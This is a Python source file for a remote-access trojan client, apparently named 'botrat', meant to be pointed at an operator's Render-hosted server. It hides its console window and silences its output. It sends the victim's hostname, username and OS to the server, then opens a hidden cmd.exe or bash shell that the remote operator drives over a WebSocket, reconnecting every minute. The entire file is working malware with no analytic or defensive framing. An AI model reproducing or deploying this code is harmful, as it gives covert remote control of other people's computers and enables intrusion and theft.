#!/usr/bin/env python3
import os
import platform
import subprocess as sp
import sys
import threading
import time

SERVER_HOST = "YOUR_RENDER_URL"  # e.g. botrat.onrender.com
SERVER_PORT = 443
USE_SSL = True


def hide_console():
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    sys.stdout = open(os.devnull, "w")
    sys.stderr = open(os.devnull, "w")


def get_os_info():
    try:
        hostname = platform.node()
        username = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        system = platform.system()
        release = platform.release()
        return f"{hostname}|{username}|{system} {release}"
    except:
        return "Unknown"


def connect_ws():
    import websocket
    try:
        proto = "wss" if USE_SSL else "ws"
        url = f"{proto}://{SERVER_HOST}:{SERVER_PORT}/ws"
        ws = websocket.create_connection(url, timeout=15, enable_multithread=True)
        return ws
    except Exception:
        return None


def main():
    hide_console()

    while True:
        try:
            ws = connect_ws()
            if not ws:
                time.sleep(60)
                continue

            ws.send(f"CLIENT_INFO:{get_os_info()}")

            if platform.system() == "Windows":
                si = sp.STARTUPINFO()
                si.dwFlags |= sp.STARTF_USESHOWWINDOW
                si.wShowWindow = sp.SW_HIDE
                p = sp.Popen(
                    ["cmd.exe"],
                    stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT,
                    startupinfo=si, creationflags=sp.CREATE_NO_WINDOW,
                )
            else:
                p = sp.Popen(["/bin/bash"], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

            def read_and_send():
                buf = bytearray()
                while True:
                    try:
                        ch = p.stdout.read(1)
                        if not ch:
                            if buf:
                                ws.send(bytes(buf), opcode=2)
                            break
                        buf.extend(ch if isinstance(ch, bytes) else ch.encode("utf-8"))
                        if ch in (b"\n", b"\r") or len(buf) >= 1024:
                            ws.send(bytes(buf), opcode=2)
                            buf.clear()
                    except:
                        break

            def recv_and_write():
                while True:
                    try:
                        data = ws.recv()
                        if not data:
                            break
                        if isinstance(data, memoryview):
                            data = bytes(data)
                        p.stdin.write(data if isinstance(data, bytes) else data.encode("utf-8"))
                        p.stdin.flush()
                    except:
                        break

            threading.Thread(target=read_and_send, daemon=True).start()
            recv_and_write()

        except Exception:
            time.sleep(60)


if __name__ == "__main__":
    main()
